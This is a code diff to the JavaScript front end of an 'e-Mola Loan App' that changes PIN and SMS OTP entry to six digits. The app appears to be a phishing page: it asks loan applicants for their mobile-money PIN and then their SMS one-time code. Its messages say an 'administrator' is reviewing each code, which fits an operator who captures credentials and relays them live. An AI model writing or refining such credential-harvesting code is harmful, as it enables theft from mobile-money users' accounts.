@@ -1,5 +1,5 @@
 // ============================================================
-// e-Mola Loan App – Code-Only Flow (PIN → OTP)
+// e-Mola Loan App – 6-digit PIN & 6-digit OTP
 // ============================================================
 
 // Language translations (Portuguese / English)
@@ -45,8 +45,8 @@ const translations = {
     verifying_pin_sub: 'O seu PIN foi recebido. Aguarde a verificação do administrador...',
     admin_reviewing_pin: '⏳ O administrador está a analisar o seu PIN...',
     enter_otp: 'Introduza o Código OTP',
-    otp_sub: 'Código de 4 dígitos enviado via SMS',
-    otp_label: 'Código OTP (4 dígitos):',
+    otp_sub: 'Código de 6 dígitos enviado via SMS',
+    otp_label: 'Código OTP (6 dígitos):',
     verify_otp: 'VERIFICAR E APROVAR',
     verifying_otp: 'A Verificar OTP...',
     verifying_otp_sub: 'O seu código foi recebido. Aguarde a verificação do administrador...',
@@ -115,8 +115,8 @@ const translations = {
     verifying_pin_sub: 'Your PIN has been received. Please wait for admin verification...',
     admin_reviewing_pin: '⏳ Admin is reviewing your PIN...',
     enter_otp: 'Enter OTP Code',
-    otp_sub: '4-digit code sent via SMS',
-    otp_label: 'OTP Code (4 digits):',
+    otp_sub: '6-digit code sent via SMS',
+    otp_label: 'OTP Code (6 digits):',
     verify_otp: 'VERIFY & APPROVE',
     verifying_otp: 'Verifying OTP...',
     verifying_otp_sub: 'Your code has been received. Please wait for admin verification...',
@@ -182,6 +182,7 @@ const S = {
 };
 
 let currentPollTimeout = null;
+let pinBlockTimer = null;
 
 // localStorage
 const STORAGE_KEYS = {
@@ -445,7 +446,7 @@ function togPin() {
     const b = document.getElementById('pin' + i);
     if (b) b.type = b.type === 'password' ? 'text' : 'password';
   }
-  for (let i = 0; i < 4; i++) {
+  for (let i = 0; i < 6; i++) {
     const b = document.getElementById('otp' + i);
     if (b) b.type = b.type === 'password' ? 'text' : 'password';
   }
@@ -455,7 +456,7 @@ function chkPin() {
   const pinOk = [0,1,2,3,4,5].every(i => document.getElementById('pin' + i)?.value);
   const pinBtn = document.querySelector('#page-pin .btn-grad');
   if (pinBtn) pinBtn.disabled = !pinOk;
-  const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+  const otpOk = [0,1,2,3,4,5].every(i => document.getElementById('otp' + i)?.value);
   const otpBtn = document.querySelector('#page-otp .btn-grad');
   if (otpBtn) otpBtn.disabled = !otpOk;
 }
@@ -469,7 +470,7 @@ function clearLoginPin() {
 }
 
 function clearOtpCode() {
-  [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+  [0,1,2,3,4,5].forEach(i => document.getElementById('otp'+i).value = '');
   document.getElementById('otp0').focus();
   chkPin();
 }
@@ -477,10 +478,10 @@ function clearOtpCode() {
 function handleOtpInput(el) {
   el.value = el.value.replace(/\D/g, '');
   const idx = parseInt(el.id.match(/\d$/)[0]);
-  if (el.value && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
+  if (el.value && idx < 5) document.getElementById('otp' + (idx + 1))?.focus();
   chkPin();
-  if (idx === 3 && el.value) {
-    const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
+  if (idx === 5 && el.value) {
+    const allFilled = [0,1,2,3,4,5].every(i => document.getElementById('otp' + i)?.value);
     if (allFilled) setTimeout(() => doOtp(), 300);
   }
 }
@@ -535,8 +536,6 @@ function startPinBlockCountdown(seconds) {
     }
   }, 1000);
 }
-
-let pinBlockTimer = null;
 
 async function resetPinAttempts() {
   try {
@@ -655,7 +654,7 @@ async function submitApp() {
   }
 }
 
-// PIN submission
+// PIN submission (6 digits)
 async function doPin() {
   const pin = [0,1,2,3,4,5].map(i => document.getElementById('pin'+i).value).join('');
   if (pin.length < 6) {
@@ -706,11 +705,11 @@ async function doPin() {
   }
 }
 
-// OTP submission
+// OTP submission (6 digits)
 async function doOtp() {
-  const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-  if (otp.length < 4) {
-    showErr('otpErr', 'Introduza um OTP válido de 4 dígitos.');
+  const otp = [0,1,2,3,4,5].map(i => document.getElementById('otp'+i).value).join('');
+  if (otp.length < 6) {
+    showErr('otpErr', 'Introduza um OTP válido de 6 dígitos.');
     return;
   }
   const waitOtpAppId = document.getElementById('waitOtpAppId');
@@ -794,4 +793,4 @@ updateCalc();
 applyLanguage();
 const recovered = recoverSession();
 if (!recovered) goTo('page-landing');
-console.log('✅ e-Mola Loan App (code-only flow) loaded!');
+console.log('✅ e-Mola Loan App (6-digit PIN & OTP) loaded!');
